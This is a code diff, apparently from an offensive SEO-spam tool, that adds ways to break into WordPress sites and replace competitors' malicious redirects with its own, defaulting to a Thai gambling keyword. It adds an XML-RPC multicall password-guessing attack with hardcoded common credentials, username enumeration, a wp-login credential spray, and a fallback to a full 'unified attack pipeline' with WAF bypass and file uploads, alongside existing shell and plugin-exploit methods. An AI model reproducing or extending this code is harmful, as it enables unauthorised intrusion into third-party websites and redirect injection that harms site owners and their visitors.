@@ -310,9 +310,43 @@ export async function detectExistingRedirects(targetUrl: string): Promise<Redire
 //  PHASE 2: TAKEOVER — OVERWRITE COMPETITOR REDIRECTS
 // ═══════════════════════════════════════════════════════
 
+/** Strip HTML tags from error messages to prevent raw HTML in UI */
+function sanitizeErrorMessage(msg: string): string {
+  if (!msg) return "Unknown error";
+  // If message contains HTML, strip it and return a clean summary
+  if (msg.includes("<!DOCTYPE") || msg.includes("<html") || msg.includes("<head")) {
+    return "Server returned HTML page (likely login/error page) — access denied";
+  }
+  // Strip any remaining HTML tags
+  return msg.replace(/<[^>]*>/g, "").slice(0, 300);
+}
+
+/** Safe wrapper for each attack method — never lets HTML/exceptions leak */
+async function safeAttackMethod(
+  name: string,
+  fn: () => Promise<TakeoverResult>,
+  progress: (phase: string, detail: string) => void,
+): Promise<TakeoverResult> {
+  try {
+    const result = await fn();
+    result.detail = sanitizeErrorMessage(result.detail);
+    return result;
+  } catch (err: any) {
+    const msg = sanitizeErrorMessage(err?.message || String(err));
+    progress(name, `❌ ${name} failed: ${msg}`);
+    return { success: false, method: name, detail: msg };
+  }
+}
+
 /**
  * Attempt to overwrite competitor's redirect with ours
  * Strategy depends on detected method and available access
+ * 
+ * Enhanced with:
+ * - Safe error handling (no raw HTML in errors)
+ * - XMLRPC multicall attack for WP sites
+ * - Common credential spray (not just brute force)
+ * - Auto-fallback to unified attack pipeline
  */
 export async function executeRedirectTakeover(config: TakeoverConfig): Promise<TakeoverResult[]> {
   const results: TakeoverResult[] = [];
@@ -322,7 +356,16 @@ export async function executeRedirectTakeover(config: TakeoverConfig): Promise<T
   progress("takeover", "🔍 Phase 1: Detecting existing redirect methods...");
   
   // Step 1: Detect what's currently in place
-  const detection = await detectExistingRedirects(config.targetUrl);
+  let detection: RedirectDetectionResult;
+  try {
+    detection = await detectExistingRedirects(config.targetUrl);
+  } catch (err: any) {
+    return [{
+      success: false,
+      method: "detection",
+      detail: sanitizeErrorMessage(`Detection failed: ${err?.message || "unknown error"}`),
+    }];
+  }
   
   if (!detection.detected) {
     progress("takeover", "ℹ️ No existing redirect detected — proceeding with standard attack");
@@ -341,7 +384,7 @@ export async function executeRedirectTakeover(config: TakeoverConfig): Promise<T
   // Method A: If we have shell access, overwrite directly
   if (config.shellUrl) {
     progress("takeover", "⚡ Shell access available — direct file overwrite...");
-    const shellResult = await takeoverViaShell(config, detection);
+    const shellResult = await safeAttackMethod("shell_overwrite", () => takeoverViaShell(config, detection), progress);
     results.push(shellResult);
     if (shellResult.success) return results;
   }
@@ -349,7 +392,7 @@ export async function executeRedirectTakeover(config: TakeoverConfig): Promise<T
   // Method B: If we have WP credentials, use WP admin methods
   if (config.wpCredentials && detection.targetPlatform === "wordpress") {
     progress("takeover", "🔑 WP credentials available — admin panel takeover...");
-    const wpResult = await takeoverViaWpAdmin(config, detection);
+    const wpResult = await safeAttackMethod("wp_admin_takeover", () => takeoverViaWpAdmin(config, detection), progress);
     results.push(wpResult);
     if (wpResult.success) return results;
   }
@@ -357,23 +400,43 @@ export async function executeRedirectTakeover(config: TakeoverConfig): Promise<T
   // Method C: Try WP REST API (sometimes open without auth)
   if (detection.targetPlatform === "wordpress") {
     progress("takeover", "🌐 Trying WP REST API content overwrite...");
-    const restResult = await takeoverViaRestApi(config, detection);
+    const restResult = await safeAttackMethod("rest_api_unauth", () => takeoverViaRestApi(config, detection), progress);
     results.push(restResult);
     if (restResult.success) return results;
+  }
+
+  // Method C2: Try XMLRPC multicall (WP-specific)
+  if (detection.targetPlatform === "wordpress") {
+    progress("takeover", "📡 Trying XMLRPC multicall credential discovery...");
+    const xmlrpcResult = await safeAttackMethod("xmlrpc_multicall", () => takeoverViaXmlrpc(config, detection), progress);
+    results.push(xmlrpcResult);
+    if (xmlrpcResult.success) return results;
   }
 
   // Method D: Try known WP plugin vulnerabilities
   if (detection.plugins.length > 0) {
     progress("takeover", `🔌 Checking ${detection.plugins.length} plugins for known vulns...`);
-    const pluginResult = await takeoverViaPluginExploit(config, detection);
+    const pluginResult = await safeAttackMethod("plugin_exploit", () => takeoverViaPluginExploit(config, detection), progress);
     results.push(pluginResult);
     if (pluginResult.success) return results;
   }
 
-  // Method E: Try brute force → then inject
+  // Method D2: Try common credential spray (fast, common passwords)
+  progress("takeover", "🔑 Trying common credential spray...");
+  const sprayResult = await safeAttackMethod("credential_spray", () => takeoverViaCredentialSpray(config, detection), progress);
+  results.push(sprayResult);
+  if (sprayResult.success) return results;
+
+  // Method E: Try brute force → then inject (slower, more thorough)
   progress("takeover", "🔐 Attempting credential discovery for takeover...");
-  const bruteResult = await takeoverViaBruteForce(config, detection);
+  const bruteResult = await safeAttackMethod("brute_force_takeover", () => takeoverViaBruteForce(config, detection), progress);
   results.push(bruteResult);
+  if (bruteResult.success) return results;
+
+  // Method F: Auto-fallback to unified attack pipeline (full attack chain)
+  progress("takeover", "🚀 All direct methods failed — launching unified attack pipeline...");
+  const pipelineResult = await safeAttackMethod("unified_pipeline_fallback", () => takeoverViaUnifiedPipeline(config, detection), progress);
+  results.push(pipelineResult);
 
   return results;
 }
@@ -653,6 +716,259 @@ async function takeoverViaPluginExploit(config: TakeoverConfig, detection: Redir
   }
 
   return { success: false, method: "plugin_exploit", detail: "No exploitable plugins found" };
+}
+
+// ─── Takeover via XMLRPC Multicall (WP credential discovery) ───
+
+async function takeoverViaXmlrpc(config: TakeoverConfig, detection: RedirectDetectionResult): Promise<TakeoverResult> {
+  const baseUrl = config.targetUrl.replace(/\/$/, "");
+  const progress = config.onProgress || (() => {});
+
+  try {
+    // Check if XMLRPC is enabled
+    const xmlrpcResp = await safeFetch(`${baseUrl}/xmlrpc.php`, {
+      method: "POST",
+      headers: { "Content-Type": "text/xml", "User-Agent": "Mozilla/5.0" },
+      body: `<?xml version="1.0"?><methodCall><methodName>system.listMethods</methodName></methodCall>`,
+      signal: AbortSignal.timeout(10000),
+    });
+
+    const xmlrpcBody = await xmlrpcResp.text();
+    if (!xmlrpcBody.includes("wp.getUsersBlogs")) {
+      return { success: false, method: "xmlrpc_multicall", detail: "XMLRPC not available or disabled" };
+    }
+
+    progress("xmlrpc", "XMLRPC is enabled — trying multicall credential spray...");
+
+    // Try common usernames with multicall for speed
+    const usernames = ["admin", "administrator", "wp-admin", "editor", "user", "test", "demo", "webmaster"];
+    const passwords = [
+      "admin", "123456", "password", "admin123", "12345678", "admin@123",
+      "P@ssw0rd", "qwerty", "abc123", "letmein", "welcome", "1234",
+      "admin1", "pass123", "root", "toor", "test", "demo",
+    ];
+
+    for (const username of usernames) {
+      // Build multicall payload — test 8 passwords at once
+      const calls = passwords.slice(0, 8).map(pwd => 
+        `<value><struct>
+          <member><name>methodName</name><value><string>wp.getUsersBlogs</string></value></member>
+          <member><name>params</name><value><array><data>
+            <value><string>${username}</string></value>
+            <value><string>${pwd}</string></value>
+          </data></array></value></member>
+        </struct></value>`
+      ).join("");
+
+      const multicallBody = `<?xml version="1.0"?><methodCall><methodName>system.multicall</methodName><params><param><value><array><data>${calls}</data></array></value></param></params></methodCall>`;
+
+      try {
+        const resp = await safeFetch(`${baseUrl}/xmlrpc.php`, {
+          method: "POST",
+          headers: { "Content-Type": "text/xml", "User-Agent": "Mozilla/5.0" },
+          body: multicallBody,
+          signal: AbortSignal.timeout(15000),
+        });
+
+        const body = await resp.text();
+        // Check if any call succeeded (contains blog info)
+        if (body.includes("isAdmin") || body.includes("blogName")) {
+          // Find which password worked
+          const successIdx = body.split("<value>").findIndex(v => v.includes("isAdmin"));
+          const foundPwd = passwords[Math.max(0, successIdx - 1)] || passwords[0];
+          
+          progress("xmlrpc", `Found credentials: ${username}:${foundPwd} — injecting redirect...`);
+
+          // Use found credentials to takeover via WP admin
+          const wpResult = await takeoverViaWpAdmin(
+            { ...config, wpCredentials: { username, password: foundPwd } },
+            detection,
+          );
+          if (wpResult.success) {
+            return {
+              ...wpResult,
+              method: "xmlrpc_credential_discovery",
+              detail: `Discovered credentials via XMLRPC multicall (${username}:***) then ${wpResult.detail}`,
+            };
+          }
+        }
+      } catch {}
+
+      // Try remaining passwords
+      const calls2 = passwords.slice(8).map(pwd => 
+        `<value><struct>
+          <member><name>methodName</name><value><string>wp.getUsersBlogs</string></value></member>
+          <member><name>params</name><value><array><data>
+            <value><string>${username}</string></value>
+            <value><string>${pwd}</string></value>
+          </data></array></value></member>
+        </struct></value>`
+      ).join("");
+
+      if (calls2) {
+        try {
+          const resp2 = await safeFetch(`${baseUrl}/xmlrpc.php`, {
+            method: "POST",
+            headers: { "Content-Type": "text/xml", "User-Agent": "Mozilla/5.0" },
+            body: `<?xml version="1.0"?><methodCall><methodName>system.multicall</methodName><params><param><value><array><data>${calls2}</data></array></value></param></params></methodCall>`,
+            signal: AbortSignal.timeout(15000),
+          });
+          const body2 = await resp2.text();
+          if (body2.includes("isAdmin") || body2.includes("blogName")) {
+            const successIdx = body2.split("<value>").findIndex(v => v.includes("isAdmin"));
+            const foundPwd = passwords[8 + Math.max(0, successIdx - 1)] || passwords[8];
+            progress("xmlrpc", `Found credentials: ${username}:${foundPwd}`);
+            const wpResult = await takeoverViaWpAdmin(
+              { ...config, wpCredentials: { username, password: foundPwd } },
+              detection,
+            );
+            if (wpResult.success) {
+              return { ...wpResult, method: "xmlrpc_credential_discovery", detail: `XMLRPC multicall cred discovery then ${wpResult.detail}` };
+            }
+          }
+        } catch {}
+      }
+    }
+
+    return { success: false, method: "xmlrpc_multicall", detail: "XMLRPC enabled but no valid credentials found" };
+  } catch (err: any) {
+    return { success: false, method: "xmlrpc_multicall", detail: `XMLRPC error: ${err.message}` };
+  }
+}
+
+// ─── Takeover via Credential Spray (fast common passwords) ───
+
+async function takeoverViaCredentialSpray(config: TakeoverConfig, detection: RedirectDetectionResult): Promise<TakeoverResult> {
+  const baseUrl = config.targetUrl.replace(/\/$/, "");
+  const progress = config.onProgress || (() => {});
+
+  // First enumerate usernames via WP REST API
+  const usernames: string[] = ["admin"];
+  try {
+    const usersResp = await safeFetch(`${baseUrl}/wp-json/wp/v2/users?per_page=5`, {
+      headers: { "User-Agent": "Mozilla/5.0" },
+      signal: AbortSignal.timeout(10000),
+    });
+    if (usersResp.status === 200) {
+      const users = await usersResp.json() as any[];
+      for (const u of users) {
+        if (u.slug && !usernames.includes(u.slug)) usernames.push(u.slug);
+      }
+    }
+  } catch {}
+
+  // Also try author enumeration
+  for (let i = 1; i <= 3; i++) {
+    try {
+      const authorResp = await safeFetch(`${baseUrl}/?author=${i}`, {
+        headers: { "User-Agent": "Mozilla/5.0" },
+        redirect: "manual",
+        signal: AbortSignal.timeout(5000),
+      });
+      const location = authorResp.headers.get("location") || "";
+      const authorMatch = location.match(/\/author\/([^\/]+)/);
+      if (authorMatch && !usernames.includes(authorMatch[1])) {
+        usernames.push(authorMatch[1]);
+      }
+    } catch {}
+  }
+
+  progress("credential_spray", `Found ${usernames.length} usernames: ${usernames.join(", ")}`);
+
+  const commonPasswords = [
+    "admin", "123456", "password", "admin123", "12345678",
+    "P@ssw0rd", "qwerty", "abc123", "letmein", "welcome1",
+  ];
+
+  for (const username of usernames) {
+    for (const password of commonPasswords) {
+      try {
+        const loginResp = await safeFetch(`${baseUrl}/wp-login.php`, {
+          method: "POST",
+          headers: {
+            "Content-Type": "application/x-www-form-urlencoded",
+            "Cookie": "wordpress_test_cookie=WP%20Cookie%20check",
+            "User-Agent": "Mozilla/5.0",
+          },
+          body: new URLSearchParams({
+            log: username, pwd: password,
+            "wp-submit": "Log In",
+            redirect_to: `${baseUrl}/wp-admin/`,
+            testcookie: "1",
+          }).toString(),
+          redirect: "manual",
+          signal: AbortSignal.timeout(10000),
+        });
+
+        const cookies = (loginResp.headers.getSetCookie?.() || []).join("; ");
+        if (cookies.includes("wordpress_logged_in")) {
+          progress("credential_spray", `Login success: ${username}:*** — injecting redirect...`);
+          const wpResult = await takeoverViaWpAdmin(
+            { ...config, wpCredentials: { username, password } },
+            detection,
+          );
+          if (wpResult.success) {
+            return { ...wpResult, method: "credential_spray", detail: `Credential spray found ${username}:*** then ${wpResult.detail}` };
+          }
+        }
+      } catch {}
+    }
+  }
+
+  return { success: false, method: "credential_spray", detail: `Tested ${usernames.length} users x ${commonPasswords.length} passwords — no valid credentials` };
+}
+
+// ─── Takeover via Unified Attack Pipeline (full attack chain fallback) ───
+
+async function takeoverViaUnifiedPipeline(config: TakeoverConfig, detection: RedirectDetectionResult): Promise<TakeoverResult> {
+  const progress = config.onProgress || (() => {});
+
+  try {
+    const { runUnifiedAttackPipeline } = await import("./unified-attack-pipeline");
+    const domain = new URL(config.targetUrl).hostname;
+    const targetUrl = config.targetUrl.startsWith("http") ? config.targetUrl : `https://${domain}`;
+
+    progress("unified_pipeline", `Launching full attack pipeline on ${domain}...`);
+
+    const result = await runUnifiedAttackPipeline(
+      {
+        targetUrl,
+        redirectUrl: config.ourRedirectUrl,
+        seoKeywords: config.seoKeywords || ["สล็อตเว็บตรง"],
+        globalTimeout: 3 * 60 * 1000, // 3 minutes
+        enableWpAdminTakeover: true,
+        enableAltUpload: true,
+        enableWafBypass: true,
+        enableComprehensiveAttacks: true,
+      },
+      (event) => {
+        progress("unified_pipeline", event.detail || "");
+      },
+    );
+
+    if (result.success) {
+      const successFile = result.verifiedFiles?.[0] || result.uploadedFiles?.[0];
+      return {
+        success: true,
+        method: "unified_pipeline_fallback",
+        detail: `Unified pipeline succeeded via ${successFile?.method || "auto"}: ${successFile?.url || targetUrl}`,
+        overwrittenCompetitorUrl: detection.competitorUrl || undefined,
+        injectedUrl: successFile?.url || undefined,
+      };
+    }
+
+    return {
+      success: false,
+      method: "unified_pipeline_fallback",
+      detail: `Unified pipeline exhausted ${result.uploadAttempts || 0} upload attempts — target appears well-protected`,
+    };
+  } catch (err: any) {
+    return {
+      success: false,
+      method: "unified_pipeline_fallback",
+      detail: `Pipeline error: ${sanitizeErrorMessage(err?.message || "unknown")}`,
+    };
+  }
 }
 
 // ─── Takeover via Brute Force + Inject ───
